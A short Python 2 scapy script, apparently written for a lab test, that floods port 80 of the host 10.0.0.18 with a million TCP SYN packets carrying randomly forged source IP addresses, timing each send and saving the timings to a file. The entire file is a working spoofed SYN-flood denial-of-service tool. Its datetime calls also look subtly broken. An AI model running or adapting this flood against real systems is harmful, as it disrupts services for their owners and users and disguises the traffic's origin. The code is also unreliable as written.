import datetime
from scapy.all import *
import random
import numpy as np

def randomIp():
	s=""+`random.randint(1, 255)`
	for i in range(0,3):
		s= s+"."+`random.randint(0, 255)`
	return s

iteration=100
numOfPacInEachIter=10000
#iteration=20
#numOfPacInEachIter=3
count=1	
numbers=[]

dt_started = datetime.utcnow()

for x in range(iteration):
	for y in range(numOfPacInEachIter):	
		try:	
			send(IP(src=randomIp(),dst="10.0.0.18")/TCP(dport=80,flags="S"))
			dt_ended = datetime.utcnow()
			sumtime=(dt_ended - dt_started).total_seconds()
			numbers.append(sumtime)
			dt_started = datetime.utcnow()
			count=count+1
			print("already sent : "+`count`)
		except:
			numOfPacInEachIter-=1
			dt_started = datetime.utcnow()
with open("python-results.txt",'w+')as f:
	f.write("syns:"+`numbers`+"\n"+`np.mean(numbers)`+"\n")
f.close()
print("done!!!!!!!!!!!!!!!!!!!!!!")
